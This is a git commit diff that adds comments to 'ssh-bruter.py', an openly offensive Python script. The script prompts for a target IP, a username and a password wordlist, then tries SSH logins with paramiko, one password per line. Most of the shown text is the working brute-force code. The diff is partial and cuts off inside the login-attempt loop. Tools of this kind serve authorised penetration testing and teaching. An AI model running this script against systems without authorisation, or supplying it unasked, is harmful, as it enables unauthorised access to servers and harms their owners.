2e550a08ace9d14d0b33e961eea65ed517dcaf7a
Augsome <92285755+Augsome@users.noreply.github.com>
2023-09-21 13:31:09 -0500

    Update ssh-bruter
    Added comments.

--- ssh-bruter.py
+++ ssh-bruter.py
@@ -2,10 +2,12 @@
 
 import paramiko,sys,os
 
+#Inputs from the user; alternatively could utilize "sys.argv[]" to accept user input from CLI
 target = str(input('Please enter target IP address: '))
 username = str(input('Please enter username to bruteforce: '))
 password_file = str(input('Please enter location of the password file: '))
 
+#Function for "ssh_connect". Successfull auth will return code 0, failed return code 1.
 def ssh_connect(password, code=0):
 	ssh = paramiko.SSHClient()
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -17,10 +19,12 @@ def ssh_connect(password, code=0):
 	ssh.close()
 	return code
 
+#Password list supplied, loop takes each line in wordlist to try
 with open(password_file, 'r') as file:
 	for line in file.readlines():
 		password = line.strip()
 
+		#The script tries SSH connection, and decided based on Paramiko response code returned.
 		try:
 			respone = ssh_connect(password)
 
